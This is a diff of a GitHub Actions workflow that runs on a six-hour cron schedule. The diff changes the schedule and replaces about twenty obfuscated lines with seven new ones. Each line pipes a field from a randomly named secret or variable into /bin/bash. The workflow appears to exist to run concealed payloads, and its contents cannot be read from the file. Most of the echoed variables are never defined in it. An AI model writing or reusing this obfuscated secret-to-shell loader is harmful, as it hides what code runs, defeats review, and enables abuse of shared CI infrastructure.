@@ -2,7 +2,7 @@ name: hugouhuolong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 5/6 * * *'
+    - cron: '30 0/6 * * *'
 
 jobs:
   build:
@@ -12,26 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: hugouhuolong
         env:
-          r1421: ${{ secrets.r1421 }}
+          ofbo243: ${{ secrets.ofbo243 }}
         run: |
-          echo $r1421 | jq -r .sq21236 | /bin/bash
-          echo $exk56623 | jq -r .v76 | /bin/bash
-          echo $scbg82129 | jq -r .ox0454 | /bin/bash
-          echo $a4122 | jq -r .r64425 | /bin/bash
-          echo $o282 | jq -r .jblt327 | /bin/bash
-          echo $dzhhk6 | jq -r .d147 | /bin/bash
-          echo $u16 | jq -r .oeg14 | /bin/bash
-          echo $dn6 | jq -r .xo217 | /bin/bash
-          echo $ewy06 | jq -r .db9 | /bin/bash
-          echo $xczg82596 | jq -r .hnc031 | /bin/bash
-          echo $if83972 | jq -r .vgta9 | /bin/bash
-          echo $kx7 | jq -r .gddj36 | /bin/bash
-          echo $ayb2 | jq -r .eac65 | /bin/bash
-          echo $oeln4173 | jq -r .rhd9 | /bin/bash
-          echo $csb4 | jq -r .dhmz7 | /bin/bash
-          echo $mbidp03759 | jq -r .meqdh007 | /bin/bash
-          echo $yp6 | jq -r .u4 | /bin/bash
-          echo $f5418 | jq -r .gj9329 | /bin/bash
-          echo $yefd214 | jq -r .sw060 | /bin/bash
-          echo $irkwv03 | jq -r .ztjt8794 | /bin/bash
+          echo $ofbo243 | jq -r .focaw049 | /bin/bash
+          echo $uq2167 | jq -r .jd4504 | /bin/bash
+          echo $yyz954 | jq -r .ucn39 | /bin/bash
+          echo $d21 | jq -r .befmt9256 | /bin/bash
+          echo $hng5418 | jq -r .u121 | /bin/bash
+          echo $tr9774 | jq -r .kq1714 | /bin/bash
+          echo $p074 | jq -r .dvtc90 | /bin/bash
 
